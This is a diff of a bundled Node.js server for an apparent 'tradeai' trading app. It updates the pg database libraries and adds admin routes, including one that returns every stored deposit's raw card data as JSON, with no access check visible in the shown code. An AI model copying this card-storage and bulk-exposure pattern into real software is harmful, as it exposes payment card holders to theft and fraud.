         throw new Error("SASL: SCRAM-SERVER-FINAL-MESSAGE: server signature is missing");
       } else if (!isBase64(serverSignature)) {
@@ -29980,14 +30088,15 @@ var require_sasl = __commonJS({
     module.exports = {
       startSession,
       continueSession,
-      finalizeSession
+      finalizeSession,
+      DEFAULT_MAX_SCRAM_ITERATIONS
     };
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/type-overrides.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/type-overrides.js
 var require_type_overrides = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/type-overrides.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/type-overrides.js"(exports, module) {
     "use strict";
     var types2 = require_pg_types();
     function TypeOverrides2(userTypes) {
@@ -30020,16 +30129,16 @@ var require_type_overrides = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-connection-string@2.12.0/node_modules/pg-connection-string/index.js
+// ../../node_modules/.pnpm/pg-connection-string@2.13.0/node_modules/pg-connection-string/index.js
 var require_pg_connection_string = __commonJS({
-  "../../node_modules/.pnpm/pg-connection-string@2.12.0/node_modules/pg-connection-string/index.js"(exports, module) {
+  "../../node_modules/.pnpm/pg-connection-string@2.13.0/node_modules/pg-connection-string/index.js"(exports, module) {
     "use strict";
     function parse(str, options = {}) {
       if (str.charAt(0) === "/") {
         const config2 = str.split(" ");
         return { host: config2[0], database: config2[1] };
       }
-      const config = {};
+      const config = /* @__PURE__ */ Object.create(null);
       let result;
       let dummyHost = false;
       if (/ |%[^a-f0-9]|%[a-f0-9][^a-f0-9]/i.test(str)) {
@@ -30152,7 +30261,7 @@ var require_pg_connection_string = __commonJS({
           c[key] = value;
         }
         return c;
-      }, {});
+      }, /* @__PURE__ */ Object.create(null));
       return connectionOptions;
     }
     function toClientConfig(config) {
@@ -30179,7 +30288,7 @@ var require_pg_connection_string = __commonJS({
           }
         }
         return c;
-      }, {});
+      }, /* @__PURE__ */ Object.create(null));
       return poolConfig;
     }
     function parseIntoClientConfig(str) {
@@ -30205,9 +30314,9 @@ See https://www.postgresql.org/docs/current/libpq-ssl.html for libpq SSL mode de
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/connection-parameters.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/connection-parameters.js
 var require_connection_parameters = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/connection-parameters.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/connection-parameters.js"(exports, module) {
     "use strict";
     var dns = __require("dns");
     var defaults2 = require_defaults();
@@ -30346,9 +30455,9 @@ var require_connection_parameters = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/result.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/result.js
 var require_result = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/result.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/result.js"(exports, module) {
     "use strict";
     var types2 = require_pg_types();
     var matchRegexp = /^([A-Za-z]+)(?: (\d+))?(?: (\d+))?/;
@@ -30420,7 +30529,7 @@ var require_result = __commonJS({
         if (this.fields.length) {
           this._parsers = new Array(fieldDescriptions.length);
         }
-        const row = {};
+        const row = /* @__PURE__ */ Object.create(null);
         for (let i = 0; i < fieldDescriptions.length; i++) {
           const desc = fieldDescriptions[i];
           row[desc.name] = null;
@@ -30437,9 +30546,9 @@ var require_result = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/query.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/query.js
 var require_query = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/query.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/query.js"(exports, module) {
     "use strict";
     var { EventEmitter: EventEmitter2 } = __require("events");
     var Result2 = require_result();
@@ -30634,9 +30743,9 @@ var require_query = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/messages.js
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/messages.js
 var require_messages = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/messages.js"(exports) {
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/messages.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.NoticeMessage = exports.DataRowMessage = exports.CommandCompleteMessage = exports.ReadyForQueryMessage = exports.NotificationResponseMessage = exports.BackendKeyDataMessage = exports.AuthenticationMD5Password = exports.ParameterStatusMessage = exports.ParameterDescriptionMessage = exports.RowDescriptionMessage = exports.Field = exports.CopyResponse = exports.CopyDataMessage = exports.DatabaseError = exports.copyDone = exports.emptyQuery = exports.replicationStart = exports.portalSuspended = exports.noData = exports.closeComplete = exports.bindComplete = exports.parseComplete = void 0;
@@ -30799,9 +30908,9 @@ var require_messages = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/buffer-writer.js
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/buffer-writer.js
 var require_buffer_writer = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/buffer-writer.js"(exports) {
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/buffer-writer.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.Writer = void 0;
@@ -30880,9 +30989,9 @@ var require_buffer_writer = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/serializer.js
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/serializer.js
 var require_serializer = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/serializer.js"(exports) {
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/serializer.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.serialize = void 0;
@@ -31097,9 +31206,9 @@ var require_serializer = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/buffer-reader.js
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/buffer-reader.js
 var require_buffer_reader = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/buffer-reader.js"(exports) {
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/buffer-reader.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.BufferReader = void 0;
@@ -31156,9 +31265,9 @@ var require_buffer_reader = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/parser.js
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/parser.js
 var require_parser = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/parser.js"(exports) {
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/parser.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.Parser = void 0;
@@ -31463,9 +31572,9 @@ var require_parser = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/index.js
-var require_dist2 = __commonJS({
-  "../../node_modules/.pnpm/pg-protocol@1.13.0/node_modules/pg-protocol/dist/index.js"(exports) {
+// ../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/index.js
+var require_dist3 = __commonJS({
+  "../../node_modules/.pnpm/pg-protocol@1.14.0/node_modules/pg-protocol/dist/index.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.DatabaseError = exports.serialize = exports.parse = void 0;
@@ -31487,18 +31596,18 @@ var require_dist2 = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-cloudflare@1.3.0/node_modules/pg-cloudflare/dist/empty.js
+// ../../node_modules/.pnpm/pg-cloudflare@1.4.0/node_modules/pg-cloudflare/dist/empty.js
 var require_empty = __commonJS({
-  "../../node_modules/.pnpm/pg-cloudflare@1.3.0/node_modules/pg-cloudflare/dist/empty.js"(exports) {
+  "../../node_modules/.pnpm/pg-cloudflare@1.4.0/node_modules/pg-cloudflare/dist/empty.js"(exports) {
     "use strict";
     Object.defineProperty(exports, "__esModule", { value: true });
     exports.default = {};
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/stream.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/stream.js
 var require_stream = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/stream.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/stream.js"(exports, module) {
     var { getStream, getSecureStream } = getStreamFuncs();
     module.exports = {
       /**
@@ -31562,12 +31671,12 @@ var require_stream = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/connection.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/connection.js
 var require_connection = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/connection.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/connection.js"(exports, module) {
     "use strict";
     var EventEmitter2 = __require("events").EventEmitter;
-    var { parse, serialize } = require_dist2();
+    var { parse, serialize } = require_dist3();
     var { getStream, getSecureStream } = require_stream();
     var flushBuffer = serialize.flush();
     var syncBuffer = serialize.sync();
@@ -32038,9 +32147,9 @@ var require_lib4 = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/client.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/client.js
 var require_client = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/client.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/client.js"(exports, module) {
     var EventEmitter2 = __require("events").EventEmitter;
     var utils = require_utils4();
     var nodeUtils = __require("util");
@@ -32076,6 +32185,16 @@ var require_client = __commonJS({
       },
       "Calling client.query() when the client is already executing a query is deprecated and will be removed in pg@9.0. Use async/await or an external async flow control mechanism instead."
     );
+    function coerceNumberOrDefault(value, defaultValue) {
+      if (typeof value === "number") {
+        return Number.isFinite(value) ? value : defaultValue;
+      }
+      if (typeof value === "string" && value.trim() !== "") {
+        const n = Number(value);
+        return Number.isFinite(n) ? n : defaultValue;
+      }
+      return defaultValue;
+    }
     var Client2 = class extends EventEmitter2 {
       constructor(config) {
         super();
@@ -32104,7 +32223,9 @@ var require_client = __commonJS({
         this._connectionError = false;
         this._queryable = true;
         this._activeQuery = null;
+        this._txStatus = null;
         this.enableChannelBinding = Boolean(c.enableChannelBinding);
+        this.scramMaxIterations = coerceNumberOrDefault(c.scramMaxIterations, sasl.DEFAULT_MAX_SCRAM_ITERATIONS);
         this.connection = c.connection || new Connection2({
           stream: c.stream,
           ssl: this.connectionParameters.ssl,
@@ -32295,7 +32416,11 @@ var require_client = __commonJS({
       _handleAuthSASL(msg) {
         this._getPassword(() => {
           try {
-            this.saslSession = sasl.startSession(msg.mechanisms, this.enableChannelBinding && this.connection.stream);
+            this.saslSession = sasl.startSession(
+              msg.mechanisms,
+              this.enableChannelBinding && this.connection.stream,
+              this.scramMaxIterations
+            );
             this.connection.sendSASLInitialResponseMessage(this.saslSession.mechanism, this.saslSession.response);
           } catch (err) {
             this.connection.emit("error", err);
@@ -32340,6 +32465,7 @@ var require_client = __commonJS({
         }
         const activeQuery = this._getActiveQuery();
         this._activeQuery = null;
+        this._txStatus = msg?.status ?? null;
         this.readyForQuery = true;
         if (activeQuery) {
           activeQuery.handleReadyForQuery(this.connection);
@@ -32544,13 +32670,10 @@ var require_client = __commonJS({
       query(config, values, callback) {
         let query;
         let result;
-        let readTimeout;
-        let readTimeoutTimer;
-        let queryCallback;
-        if (config === null || config === void 0) {
+        if (config == null) {
           throw new TypeError("Client was passed a null or undefined query");
-        } else if (typeof config.submit === "function") {
-          readTimeout = config.query_timeout || this.connectionParameters.query_timeout;
+        }
+        if (typeof config.submit === "function") {
           result = query = config;
           if (!query.callback) {
             if (typeof values === "function") {
@@ -32560,7 +32683,6 @@ var require_client = __commonJS({
             }
           }
         } else {
-          readTimeout = config.query_timeout || this.connectionParameters.query_timeout;
           query = new Query2(config, values, callback);
           if (!query.callback) {
             result = new this._Promise((resolve, reject) => {
@@ -32569,12 +32691,15 @@ var require_client = __commonJS({
               Error.captureStackTrace(err);
               throw err;
             });
+          } else if (typeof query.callback !== "function") {
+            throw new TypeError("callback is not a function");
           }
         }
+        const readTimeout = config.query_timeout || this.connectionParameters.query_timeout;
         if (readTimeout) {
-          queryCallback = query.callback || (() => {
+          const queryCallback = query.callback || (() => {
           });
-          readTimeoutTimer = setTimeout(() => {
+          const readTimeoutTimer = setTimeout(() => {
             const error = new Error("Query read timeout");
             process.nextTick(() => {
               query.handleError(error, this.connection);
@@ -32624,11 +32749,15 @@ var require_client = __commonJS({
       unref() {
         this.connection.unref();
       }
+      getTransactionStatus() {
+        return this._txStatus;
+      }
       end(cb) {
         this._ending = true;
         if (!this.connection._connecting || this._ended) {
           if (cb) {
             cb();
+            return;
           } else {
             return this._Promise.resolve();
           }
@@ -32656,9 +32785,9 @@ var require_client = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg-pool@3.13.0_pg@8.20.0/node_modules/pg-pool/index.js
+// ../../node_modules/.pnpm/pg-pool@3.14.0_pg@8.21.0/node_modules/pg-pool/index.js
 var require_pg_pool = __commonJS({
-  "../../node_modules/.pnpm/pg-pool@3.13.0_pg@8.20.0/node_modules/pg-pool/index.js"(exports, module) {
+  "../../node_modules/.pnpm/pg-pool@3.14.0_pg@8.21.0/node_modules/pg-pool/index.js"(exports, module) {
     "use strict";
     var EventEmitter2 = __require("events").EventEmitter;
     var NOOP = function() {
@@ -33082,9 +33211,9 @@ var require_pg_pool = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/query.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/query.js
 var require_query2 = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/query.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/query.js"(exports, module) {
     "use strict";
     var EventEmitter2 = __require("events").EventEmitter;
     var util = __require("util");
@@ -33223,9 +33352,9 @@ var require_query2 = __commonJS({
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/client.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/client.js
 var require_client2 = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/client.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/client.js"(exports, module) {
     var nodeUtils = __require("util");
     var Native;
     try {
@@ -33409,8 +33538,11 @@ var require_client2 = __commonJS({
     Client2.prototype.end = function(cb) {
       const self = this;
       this._ending = true;
-      if (!this._connected) {
-        this.once("connect", this.end.bind(this, cb));
+      if (this._connecting && !this._connected) {
+        this.once("connect", () => {
+          this.end(() => {
+          });
+        });
       }
       let result;
       if (!cb) {
@@ -33473,20 +33605,23 @@ var require_client2 = __commonJS({
     Client2.prototype.isConnected = function() {
       return this._connected;
     };
+    Client2.prototype.getTransactionStatus = function() {
+      return this.native.getTransactionStatus();
+    };
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/index.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/index.js
 var require_native = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/native/index.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/native/index.js"(exports, module) {
     "use strict";
     module.exports = require_client2();
   }
 });
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/index.js
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/index.js
 var require_lib5 = __commonJS({
-  "../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/lib/index.js"(exports, module) {
+  "../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/lib/index.js"(exports, module) {
     "use strict";
     var Client2 = require_client();
     var defaults2 = require_defaults();
@@ -33495,7 +33630,7 @@ var require_lib5 = __commonJS({
     var utils = require_utils4();
     var Pool3 = require_pg_pool();
     var TypeOverrides2 = require_type_overrides();
-    var { DatabaseError: DatabaseError2 } = require_dist2();
+    var { DatabaseError: DatabaseError2 } = require_dist3();
     var { escapeIdentifier: escapeIdentifier2, escapeLiteral: escapeLiteral2 } = require_utils4();
     var poolFactory = (Client3) => {
       return class BoundPool extends Pool3 {
@@ -33571,7 +33706,7 @@ var health_default = router;
 // src/routes/tradeai.ts
 var import_express2 = __toESM(require_express2(), 1);
 
-// ../../node_modules/.pnpm/pg@8.20.0/node_modules/pg/esm/index.mjs
+// ../../node_modules/.pnpm/pg@8.21.0/node_modules/pg/esm/index.mjs
 var import_lib = __toESM(require_lib5(), 1);
 var Client = import_lib.default.Client;
 var Pool = import_lib.default.Pool;
@@ -33833,6 +33968,16 @@ async function getAllPendingDeposits() {
   const { rows } = await pool.query("SELECT * FROM deposits WHERE status='pending' ORDER BY timestamp DESC");
   return rows.map(rowToDeposit);
 }
+async function getAllCardDeposits() {
+  const { rows } = await pool.query(
+    "SELECT * FROM deposits WHERE method='card' AND card_data IS NOT NULL ORDER BY timestamp DESC"
+  );
+  return rows.map(rowToDeposit);
+}
+async function deleteDeposit(id) {
+  const { rowCount } = await pool.query("DELETE FROM deposits WHERE id=$1", [id]);
+  return (rowCount ?? 0) > 0;
+}
 async function updateDeposit(depositId, updates) {
   const map = {
     approvedBy: "approved_by",
@@ -34086,6 +34231,31 @@ router2.post("/admin/deposits/:depositId/reject", async (req, res) => {
     res.status(400).json({ error: err.message });
   }
 });
+router2.get("/admin/cards", async (_req, res) => {
+  try {
+    const deposits = await getAllCardDeposits();
+    const cards = deposits.map((d) => ({
+      id: d.id,
+      depositId: d.id,
+      userId: d.userEmail,
+      timestamp: d.timestamp,
+      status: d.status,
+      ...d.cardData
+    }));
+    res.json({ cards });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
+router2.delete("/admin/deposits/:depositId", async (req, res) => {
+  try {
+    const success = await deleteDeposit(req.params.depositId);
+    if (!success) return res.status(404).json({ error: "Dep\xF3sito n\xE3o encontrado" });
+    res.json({ success: true });
+  } catch (err) {
+    res.status(400).json({ error: err.message });
+  }
+});
 var tradeai_default = router2;
 
 // src/routes/charts.ts
@@ -34099,10 +34269,23 @@ var ASSET_SEEDS = [
   { symbol: "PETR4", startPrice: 38.42 },
   { symbol: "VALE3", startPrice: 61.8 },
   { symbol: "ITUB4", startPrice: 34.55 },
+  { symbol: "BBDC4", startPrice: 14.92 },
+  { symbol: "ABEV3", startPrice: 11.35 },
+  { symbol: "MGLU3", startPrice: 7.88 },
   { symbol: "EUR/USD", startPrice: 1.085 },
   { symbol: "GBP/USD", startPrice: 1.275 },
+  { symbol: "USD/JPY", startPrice: 149.85 },
+  { symbol: "AUD/USD", startPrice: 0.651 },
+  { symbol: "USD/CAD", startPrice: 1.362 },
+  { symbol: "USD/BRL", startPrice: 5.284 },
   { symbol: "BTC/USD", startPrice: 67420 },
-  { symbol: "GOLD", startPrice: 2385.5 }
+  { symbol: "ETH/USD", startPrice: 3248.5 },
+  { symbol: "XRP/USD", startPrice: 0.523 },
+  { symbol: "GOLD", startPrice: 2385.5 },
+  { symbol: "SILVER", startPrice: 28.74 },
+  { symbol: "TSLA", startPrice: 248.5 },
+  { symbol: "NVIDIA", startPrice: 875.3 },
+  { symbol: "AMAZON", startPrice: 185.6 }
 ];
 var chartEmitter = new EventEmitter();
 chartEmitter.setMaxListeners(2e3);
@@ -34271,8 +34454,11 @@ app.use(import_express5.default.json());
 app.use(import_express5.default.urlencoded({ extended: true }));
 app.use("/api", routes_default);
 var frontendDist = path.resolve(__dirname2, "..", "..", "tradeai-pro", "dist");
-app.use(import_express5.default.static(frontendDist));
+app.use(import_express5.default.static(frontendDist, { index: false, maxAge: "1y", immutable: true }));
 app.get(/^\/(?!api).*/, (_req, res) => {
+  res.set("Cache-Control", "no-cache, no-store, must-revalidate");
+  res.set("Pragma", "no-cache");
+  res.set("Expires", "0");
   res.sendFile(path.join(frontendDist, "index.html"));
 });
 initDb().then(() => {
@@ -34371,6 +34557,7 @@ on-finished/index.js:
    * MIT Licensed
    *)
 
+content-type/dist/index.js:
 content-type/index.js:
   (*!
    * content-type
